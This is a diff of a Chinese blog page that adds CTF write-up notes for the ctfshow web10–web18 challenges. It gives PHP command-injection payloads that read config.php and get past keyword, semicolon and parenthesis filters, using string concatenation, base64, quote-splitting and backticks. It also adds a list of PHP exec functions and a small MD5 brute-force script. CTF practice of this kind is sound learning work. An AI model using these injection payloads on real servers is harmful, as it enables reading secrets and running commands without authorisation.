@@ -443,14 +443,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    298
+                    731
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -490,17 +490,62 @@
 
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;highlight_file(&#39;config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>这次代码中过滤了system，exec，highlight函数。</p>
-<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;show_soure(&#39;config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>这次代码中过滤了system，exec，highlight函数,可采用第一种读取config.php的方法，也可采用第二种构造函数的方法。</p>
+<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;show_source(&#39;config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;cat config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>这次过滤了cat可以继续使用web10中第一种payload。读取文件不只有cat，还有more</p>
+<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;passthru(&#39;cat config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>这次过滤了cat可以继续使用web10中第一种payload。读取文件不只有cat，还有more。或者采取第二种payload</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;more config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;passthru(&quot;ca&#39;&#39;t config.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>代码中过滤了cat，.   ,  php,config都过滤了，所以将要传参得内容base64编码，再在地址栏里进行解码</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);$b&#x3D;base64_decode(&quot;Y2F0IGNvbmZpZy5waHA&#x3D;&quot;);$a($b);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>这次代码把“；”也过滤了，又触及到了我知识盲点，百度亿下大佬的wp，得到下面的payload</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ca''t `ls`"</span><span class="token punctuation">)</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>小结：php中作为系统中执行外部命令的有如下（奈何我php辣鸡加上题量太少，好多外部执行用不明白）</p>
+<pre class="line-numbers language-none"><code class="language-none">system()
+passthru()
+exec()
+shell_exec()
+popen()
+proc_open()
+pcntl_exec()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>另外因为把分号过滤了，所以用?&gt;闭合函数，ls两边是反引号，在tab键上面，第一次知道还有这个。linux中反引号作用是将反引号里的内容先执行，然后把结果cat出来，右击查看源码</p>
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>这次代码又多过滤了括号，构造如下payload</p>
+<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;echo &#96;$_POST[a]&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>再给a传参a=cat config.php</p>
+<p>简单来说就是输出post的值，a为读取config.php,所以就输出读取之后的值</p>
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>这次又多过滤了&lt;&gt;?,但是没过滤分号，皆大欢喜，构造如下</p>
+<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;echo &#96;$_POST[a]&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>给a传参a=cat config.php</p>
+<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"a6f57ae38a22448c2f07f3f95f49c84e"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这串代码就是说(ctfshow+$c)的MD5值等于a6f57ae38a22448c2f07f3f95f49c84e</p>
+<p>MD5值固定长度为32位，c的长度为3。写一个简单的暴力破解MD5</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+a<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> k <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+            s<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'ctfshow'</span><span class="token operator">+</span>i<span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> s<span class="token operator">==</span><span class="token string">'a6f57ae38a22448c2f07f3f95f49c84e'</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>结果为36d，给c传36d，得到flag</p>
+<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>额，，，，文件包含的题我还没咋看，大佬的wp看不太懂，先pass</p>
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>文件包含，pass，先挖个坑，日后再学</p>
 
                 
             </div>
@@ -739,18 +784,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="">
+                <a href="../upload-labs/">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/22.jpg" class="responsive-img" alt="Ctfshow">
+                        <img src="../../../../medias/featureimages/6.jpg" class="responsive-img" alt="Upload-Labs">
                         
-                        <span class="card-title">Ctfshow</span>
+                        <span class="card-title">Upload-Labs</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -760,9 +804,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-08
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-08
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -771,16 +815,11 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="../../../../tags/ctfshow/">
-                        <span class="chip bg-color">ctfshow</span>
-                    </a>
-                    
-                    <a href="../../../../tags/%E8%90%8C%E6%96%B0/">
-                        <span class="chip bg-color">萌新</span>
+                    <a href="../../../../tags/upload-labs/">
+                        <span class="chip bg-color">upload-labs</span>
                     </a>
                     
                 </div>
@@ -1028,7 +1067,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">379</span>&nbsp;字
+                class="white-color">900</span>&nbsp;字
             
             
             
